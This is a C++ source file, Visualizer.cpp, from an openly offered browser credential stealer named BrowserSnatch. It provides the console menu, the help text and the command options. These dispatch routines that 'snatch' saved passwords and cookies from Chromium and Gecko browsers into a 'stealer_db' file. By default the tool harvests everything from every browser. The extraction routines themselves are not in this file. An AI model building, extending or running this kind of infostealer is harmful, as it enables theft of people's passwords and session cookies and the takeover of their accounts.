#include "includes/Visualizer.h"
#include "includes/ChromiumParser.h"
#include "includes/GeckoParser.h"

Visualizer::Visualizer()
{}

Visualizer::~Visualizer()
{}

Visualizer::Visualizer(const std::string& converted_username, const std::string& stealer_db)
{
    this->converted_username = converted_username;
    this->stealer_db = stealer_db;
}

void Visualizer::visualization_main() {
    int choice;
    do {
        printMenu();
        std::cout << "\n\033[1;34mChoose an option to proceed (0-5): \033[0m";
        std::cin >> choice;

        handleUserChoice(choice);

        if (choice != 0) {
            std::cout << "\nPress Enter to continue...";
            std::cin.ignore();  // Consume newline character left by cin
            std::cin.get();     // Wait for Enter key
        }
    } while (choice != 0);
}

void Visualizer::clearConsole() {
    system("cls");
}

void Visualizer::printDivider(char ch, int length) {
    std::cout << std::string(length, ch) << std::endl;
}

void Visualizer::printMenu() {
    clearConsole();
    printDivider('=', 75);
    std::cout << "    \033[1;32mBrowserSnatch\033[0m - A Versatile Browser Data Extraction Tool © shaddy43" << std::endl;
    printDivider('=', 75);
    std::cout << "\n \033[1;36m[1]\033[0m Snatch Chromium Based Browser Passwords" << std::endl;
    std::cout << " \033[1;36m[2]\033[0m Snatch Gecko Based Browser Passwords" << std::endl;
    std::cout << " \033[1;36m[3]\033[0m Snatch Chromium Based Browser Cookies" << std::endl;
    std::cout << " \033[1;36m[4]\033[0m Snatch Gecko Based Browser Cookies" << std::endl;
    std::cout << " \033[1;36m[5]\033[0m Snatch Everything {default settings}" << std::endl;
    std::cout << " \033[1;31m[0]\033[0m Exit" << std::endl;
    printDivider('=', 75);
}

BOOL Visualizer::default_settings(std::string converted_username, std::string stealer_db)
{
    std::cout << "BrowserSnatch Executed with {default settings}" << std::endl;
    if (!chromium_parser(converted_username, stealer_db))
        std::cout << "Chromium Browsers dump failed!" << std::endl;

    if (!gecko_parser(converted_username, stealer_db))
        std::cout << "Gecko Browsers dump failed!" << std::endl;

    if (!gecko_cookie_collector(converted_username, stealer_db))
        std::cout << "Gecko Cookie Collector failed!" << std::endl;

    if (!chromium_cookie_collector(converted_username, stealer_db))
        std::cout << "Chromium Cookie Collector failed!" << std::endl;

    if (std::filesystem::exists(stealer_db)) {
        std::cout << "Stealer db saved: " << stealer_db << std::endl;
        return true;
    }
    else {
        return false;
    }
}

// Function to handle the user's choice
void Visualizer::handleUserChoice(int choice) {
    switch (choice) {
    case 1:
        std::cout << "\n\033[1;33m>> Snatching Chromium Passwords...\033[0m" << std::endl;
        if (!chromium_parser(converted_username, stealer_db))
            std::cerr << "Chromium Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 2:
        std::cout << "\n\033[1;33m>> Snatching Gecko Passwords...\033[0m" << std::endl;
        if (!gecko_parser(converted_username, stealer_db))
            std::cerr << "Gecko Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 3:
        std::cout << "\n\033[1;33m>> Snatching Chromium Cookies...\033[0m" << std::endl;
        if (!chromium_cookie_collector(converted_username, stealer_db))
            std::cerr << "Chromium Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 4:
        std::cout << "\n\033[1;33m>> Snatching Gecko Cookies...\033[0m" << std::endl;
        if (!gecko_cookie_collector(converted_username, stealer_db))
            std::cerr << "Gecko Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 5:
        std::cout << "\n\033[1;33m>> Snatching Everything {default settings}...\033[0m" << std::endl;
        if (!default_settings(converted_username, stealer_db))
            std::cerr << "BrowserSnatch executed with {default settings}" << std::endl;
        break;
    case 0:
        std::cout << "\n\033[1;31mExiting BrowserSnatch. Goodbye!\033[0m" << std::endl;
        break;
    default:
        std::cout << "\n\033[1;31mInvalid choice! Please try again.\033[0m" << std::endl;
    }
}

void Visualizer::displayHelp() {
    std::cout << "BrowserSnatch v1.0 - A versatile browser data extraction tool\n";
    std::cout << "(C) 2024 shaddy43\n\n";
    std::cout << "Usage: BrowserSnatch [OPTIONS]\n\n";
    std::cout << "No parameter        Run with default settings, snatch everything from all browsers\n\n";
    std::cout << "Options:\n";
    std::cout << "  -h                Help menu\n";
    std::cout << "  -pass             Snatch passwords from every browser\n";
    std::cout << "  -pass -c          Snatch passwords from Chromium browsers only\n";
    std::cout << "  -pass -g          Snatch passwords from Gecko browsers only\n";
    std::cout << "  -cookies          Snatch cookies from every browser\n";
    std::cout << "  -cookies -c       Snatch cookies from Chromium browsers only\n";
    std::cout << "  -cookies -g       Snatch cookies from Gecko browsers only\n";
    std::cout << "  -console-mode     Launch BrowserSnatch Console Mode\n\n";
    std::cout << "For more details, visit: https://shaddy43.github.io\n";
}

void Visualizer::handler(int option)
{
    if (option == 1)
    {
        if (!chromium_parser(converted_username, stealer_db))
            std::cerr << "Chromium Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 2)
    {
        if (!gecko_parser(converted_username, stealer_db))
            std::cerr << "Gecko Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 3)
    {
        if (!chromium_parser(converted_username, stealer_db) and !gecko_parser(converted_username, stealer_db))
            std::cerr << "Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 4)
    {
        if (!chromium_cookie_collector(converted_username, stealer_db))
            std::cerr << "Chromium Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 5)
    {
        if (!gecko_cookie_collector(converted_username, stealer_db))
            std::cerr << "Gecko Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 6)
    {
        if (!chromium_cookie_collector(converted_username, stealer_db) and !gecko_cookie_collector(converted_username, stealer_db))
            std::cerr << "Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
}
